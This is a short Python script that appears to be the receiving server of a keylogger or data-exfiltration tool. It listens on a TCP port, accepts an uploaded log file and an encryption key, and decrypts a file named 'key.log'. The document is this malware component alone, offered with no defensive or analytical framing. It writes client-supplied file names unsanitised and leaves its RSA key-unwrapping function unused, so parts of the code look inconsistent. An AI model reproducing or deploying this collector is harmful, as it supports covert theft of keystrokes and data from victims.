import socket
import rsa
from cryptography.fernet import Fernet

SERVER = '192.168.29.131'
PORT = 8865

# Define functions before socket binding


def prep_key(enc_key):
    priv_key = rsa.PrivateKey.load_pkcs1(open('private.pem', 'rb').read())
    return Fernet(rsa.decrypt(enc_key, priv_key))


def decrypt_file(f_key: Fernet, file: str):
    enc_logs = open(file, 'rb').read()
    with open(file, 'wb') as logfile:
        logfile.write(f_key.decrypt(enc_logs))
    return f_key.decrypt(enc_logs)


def recv_file():
    client, addr = s.accept()
    file_name = str(client.recv(1024).decode().replace(' ', ''))
    with open(file_name, 'wb') as file:
        file_bytes = b''
        done = False
        while not done:
            data = client.recv(1024)
            print(data)
            if data[-13:] == (b'<END OF FILE>'):
                print(f'[!]\tFile Received: {file_name}')
                done = True
            else:
                print('downloading file...')
            file_bytes += data
        # print(f'saving: {file_bytes[:-13]}')
        file.write(file_bytes[:-13])
        client.close()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SERVER, PORT))
s.listen(5)

recv_file()     # for logs
recv_file()     # for key

enc_key = open('fernet.key', 'rb').read()
print(enc_key)
# Pass the file name as well
decrypt_file(Fernet(enc_key), 'key.log')
s.close()
